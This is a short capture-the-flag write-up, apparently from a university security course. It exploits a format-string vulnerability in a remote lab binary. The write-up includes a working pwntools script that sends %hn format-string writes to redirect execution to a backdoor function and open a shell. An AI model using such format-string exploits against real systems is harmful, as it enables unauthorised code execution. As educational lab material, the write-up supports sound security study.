![alt text](img/Screenshot%202022-12-15%20at%2003.38.56.JPG)

Used checksec to check protections and found out it had a Canary so couldn't just do a normal buffer overflow attack. However, we found we could exploit vuknerabilities related to strings.

![alt text](img/Screenshot%202022-12-15%20at%2003.42.31.JPG)

After analysing the functions in the program, we found the old_backdoor file particularly interesting, as we could use its system call to exploit the address where it was located to run the function and compromise the system.

We found the old_backdoor address to be ```0x0804c010```, and using format strings vulnerabilities, we wrote the following code to explot this weakness:

```python
from pwn import *

LOCAL = False

if LOCAL:
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4007)

#0x08049236  old_backdoor

N = 60
content = bytearray(0x0 for i in range(N))

content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
content[8:12]  =  ("????").encode('latin-1')
content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')

s = "%.2036x" + "%hn" + "%.35378x%hn"

fmt  = (s).encode('latin-1')
content[16:16+len(fmt)] = fmt

p.recvuntil(b"here...")
p.sendline(content)
p.interactive()
```

This script opened a new shell which we used to get the flag.

![alt text](img/Screenshot%202022-12-15%20at%2003.49.30.JPG)